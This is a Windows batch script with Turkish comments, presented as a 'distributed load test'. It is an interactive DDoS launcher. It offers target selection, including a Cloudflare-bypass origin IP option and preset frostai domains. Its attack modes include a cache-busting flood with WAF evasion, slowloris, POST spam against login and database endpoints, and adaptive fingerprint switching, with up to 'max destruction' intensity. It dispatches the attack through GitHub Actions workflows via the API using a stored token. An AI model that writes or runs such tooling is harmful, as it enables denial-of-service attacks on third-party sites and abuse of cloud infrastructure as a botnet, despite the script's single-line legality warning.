@echo off
REM ================================================================
REM  🚀 DISTRIBUTED LOAD TEST — TEK HESAP MODU
REM
REM  Menü akışı:
REM    1. Hedef seçimi (5 seçenek)
REM    2. Attack mode (flood/slowloris/post/adaptive/legacy)
REM    3. Yoğunluk (5 preset veya manuel)
REM    4. Onay + trigger
REM
REM  Multi-account 40 bot saldirisi icin: attack-mega.bat
REM ================================================================
setlocal enabledelayedexpansion
chcp 65001 >nul

REM Secrets yükle (once .bat sonra eski .env)
if exist "config\secrets.bat" (
    call config\secrets.bat
) else if exist "config\secrets.env" (
    call config\secrets.env
) else (
    echo HATA: config\secrets.bat bulunamadi!
    pause
    exit /b 1
)

REM Tek hesap: GH1 kullan
set "GH_USER=%GH1_USER%"
set "GH_REPO=%GH1_REPO%"
set "GH_TOKEN=%GH1_TOKEN%"
set "WORKFLOW_ID=%GH1_WORKFLOW_ID%"

echo.
echo ╔══════════════════════════════════════════════════════╗
echo ║   🎯 DISTRIBUTED LOAD TEST — TEK HESAP              ║
echo ║   Hesap: %GH_USER%                          ║
echo ╚══════════════════════════════════════════════════════╝
echo.

REM ================ MENU 1: HEDEF SECIMI ================
echo   [1/4] HEDEF SECIMI
echo.
echo     [1] https://hhh.frostai.com.tr    (Cloudflare arkasi)
echo     [2] https://frostai.xyz            (Cloudflare arkasi)
echo     [3] https://frostai.com.tr         (Cloudflare arkasi)
echo     [4] Manuel URL gir                 (herhangi bir URL)
echo     [5] 🎯 IP + Port + Host header    (Cloudflare BYPASS / origin)
echo.
set /p SECIM="Hedef mod (1-5): "

set "HOST_HEADER="
set "TARGET_URL="

if "%SECIM%"=="1" set "TARGET_URL=https://hhh.frostai.com.tr"
if "%SECIM%"=="2" set "TARGET_URL=https://frostai.xyz"
if "%SECIM%"=="3" set "TARGET_URL=https://frostai.com.tr"
if "%SECIM%"=="4" (
    set /p TARGET_URL="Hedef URL girin (http:// veya https:// ile): "
)
if "%SECIM%"=="5" (
    echo.
    echo   Protokol:
    echo     [1] HTTP  (port 80 tipik)
    echo     [2] HTTPS (port 443 tipik) - SSL bypass
    set /p PROTO="Protokol sec (1-2): "

    if "!PROTO!"=="1" (
        set "SCHEME=http"
        set "DEFAULT_PORT=80"
    ) else if "!PROTO!"=="2" (
        set "SCHEME=https"
        set "DEFAULT_PORT=443"
    ) else (
        echo Gecersiz protokol!
        pause
        exit /b 1
    )

    echo.
    set /p ORIGIN_IP="Origin IP (orn: 50.7.234.86): "
    if "!ORIGIN_IP!"=="" (
        echo IP bos olamaz!
        pause
        exit /b 1
    )

    set /p PORT="Port [default: !DEFAULT_PORT!]: "
    if "!PORT!"=="" set "PORT=!DEFAULT_PORT!"

    echo.
    set /p HOST_HEADER="Host header (opsiyonel, bos birak = default vhost): "

    if "!PORT!"=="!DEFAULT_PORT!" (
        set "TARGET_URL=!SCHEME!://!ORIGIN_IP!"
    ) else (
        set "TARGET_URL=!SCHEME!://!ORIGIN_IP!:!PORT!"
    )
)

if "!TARGET_URL!"=="" (
    echo Gecersiz secim!
    pause
    exit /b 1
)

echo.
echo   ✅ Hedef: !TARGET_URL!
if not "!HOST_HEADER!"=="" echo   ✅ Host  : !HOST_HEADER!
echo.
echo   ══════════════════════════════════════════════════════

REM ================ MENU 2: ATTACK MODE ================
echo.
echo   [2/4] ATTACK MODE SECIMI
echo.
echo     [1] 🔥 FLOOD     - Multi-endpoint cache-bypass (STANDART)
echo         Yuksek RPS, cesitli endpoint, WAF kandirma
echo.
echo     [2] 🐢 SLOWLORIS - Connection pool tuketici
echo         Origin IP saldirisi icin en iyi (Cloudflare arkasinda etkisiz)
echo.
echo     [3] 💣 POST      - Backend CPU/DB killer
echo         Login/register/graphql/xmlrpc spam (bcrypt/DB odakli)
echo.
echo     [4] 🧠 ADAPTIVE  - Response-aware akilli saldiri
echo         429 alsa geri ceker, 403 alsa fingerprint degistirir
echo.
echo     [5] 📜 LEGACY    - Eski basit GET flood (geriye uyumluluk)
echo.
set /p MODE_CHOICE="Attack mode (1-5) [default: 1]: "
if "%MODE_CHOICE%"=="" set "MODE_CHOICE=1"

if "%MODE_CHOICE%"=="1" set "ATTACK_MODE=flood"
if "%MODE_CHOICE%"=="2" set "ATTACK_MODE=slowloris"
if "%MODE_CHOICE%"=="3" set "ATTACK_MODE=post"
if "%MODE_CHOICE%"=="4" set "ATTACK_MODE=adaptive"
if "%MODE_CHOICE%"=="5" set "ATTACK_MODE=legacy"

if "!ATTACK_MODE!"=="" (
    echo Gecersiz mode!
    pause
    exit /b 1
)

echo.
echo   ✅ Mode: !ATTACK_MODE!
echo.

REM ================ MENU 3: YOGUNLUK ================
echo   [3/4] YOGUNLUK SECIMI
echo.
if "!ATTACK_MODE!"=="slowloris" (
    echo     [1] 🟢 Hafif   - 3m  / 1000 VU / 5 bot   ^(test^)
    echo     [2] 🟡 Orta    - 5m  / 3000 VU / 20 bot  ^(STANDART slowloris^)
    echo     [3] 🟠 Agresif - 10m / 5000 VU / 20 bot  ^(guclu^)
    echo     [4] 🔴 Max     - 20m / 8000 VU / 20 bot  ^(MAX yikim^)
    echo     [5] Manuel
) else (
    echo     [1] 🟢 Hafif   - 60s  / 100 VU / 5 bot   ^(test^)
    echo     [2] 🟡 Orta    - 120s / 300 VU / 20 bot  ^(STANDART^)
    echo     [3] 🟠 Agresif - 5m   / 500 VU / 20 bot  ^(guclu^)
    echo     [4] 🔴 Full    - 20m  / 500 VU / 20 bot  ^(uzun test^)
    echo     [5] Manuel
)
echo.
set /p YOGUNLUK="Yogunluk (1-5): "

if "!ATTACK_MODE!"=="slowloris" (
    if "%YOGUNLUK%"=="1" ( set "DURATION=3m"  & set "VUS=1000" & set "JOBS=5"  & set "RPS=0" )
    if "%YOGUNLUK%"=="2" ( set "DURATION=5m"  & set "VUS=3000" & set "JOBS=20" & set "RPS=0" )
    if "%YOGUNLUK%"=="3" ( set "DURATION=10m" & set "VUS=5000" & set "JOBS=20" & set "RPS=0" )
    if "%YOGUNLUK%"=="4" ( set "DURATION=20m" & set "VUS=8000" & set "JOBS=20" & set "RPS=0" )
) else (
    if "%YOGUNLUK%"=="1" ( set "DURATION=60s"  & set "VUS=100" & set "JOBS=5"  & set "RPS=0" )
    if "%YOGUNLUK%"=="2" ( set "DURATION=120s" & set "VUS=300" & set "JOBS=20" & set "RPS=0" )
    if "%YOGUNLUK%"=="3" ( set "DURATION=5m"   & set "VUS=500" & set "JOBS=20" & set "RPS=0" )
    if "%YOGUNLUK%"=="4" ( set "DURATION=20m"  & set "VUS=500" & set "JOBS=20" & set "RPS=0" )
)

if "%YOGUNLUK%"=="5" (
    set /p DURATION="Sure (60s, 3m, 10m): "
    set /p VUS="VU per bot: "
    set /p JOBS="Paralel bot (1-20): "
    set /p RPS="RPS limit (0=sinirsiz): "
)

if "!DURATION!"=="" (
    echo Gecersiz yogunluk!
    pause
    exit /b 1
)

REM ================ MENU 4: ONAY ================
echo.
echo ╔══════════════════════════════════════════════════════╗
echo ║   [4/4] ONAY BEKLENIYOR                              ║
echo ╚══════════════════════════════════════════════════════╝
echo   Hedef       : !TARGET_URL!
if not "!HOST_HEADER!"=="" echo   Host        : !HOST_HEADER!
echo   Attack mode : !ATTACK_MODE!
echo   Sure        : !DURATION!
echo   VU per bot  : !VUS!
echo   Paralel bot : !JOBS!
echo   RPS limit   : !RPS!
echo   Hesap       : %GH_USER% (tek hesap)
echo ══════════════════════════════════════════════════════
echo.
echo   ⚠️  Bu URL/IP SIZE MI AIT? Baskasinin sistemi = SUC!
echo.
set /p ONAY="Onayliyor musunuz? (EVET yazin): "
if /i not "!ONAY!"=="EVET" (
    echo   Iptal edildi.
    pause
    exit /b
)

echo.
echo   🚀 Trigger gonderiliyor...

set "PAYLOAD={\"ref\":\"main\",\"inputs\":{\"target_url\":\"!TARGET_URL!\",\"duration\":\"!DURATION!\",\"vus_per_runner\":\"!VUS!\",\"rps_per_runner\":\"!RPS!\",\"parallel_jobs\":\"!JOBS!\",\"host_header\":\"!HOST_HEADER!\",\"attack_mode\":\"!ATTACK_MODE!\"}}"

curl -sS -X POST ^
  -H "Authorization: token %GH_TOKEN%" ^
  -H "Accept: application/vnd.github+json" ^
  "https://api.github.com/repos/%GH_USER%/%GH_REPO%/actions/workflows/%WORKFLOW_ID%/dispatches" ^
  -d "!PAYLOAD!" -o nul -w "   HTTP: %%{http_code}\n"

echo.
echo   ✅ Trigger gonderildi. Workflow ~10 saniye icinde baslar.
echo.
echo   📊 Canli monitor aciliyor...
echo.
timeout /t 3 /nobreak >nul

powershell -ExecutionPolicy Bypass -NoProfile -File "%~dp0monitor.ps1"

echo.
echo   Sonuclar: https://github.com/%GH_USER%/%GH_REPO%/actions
pause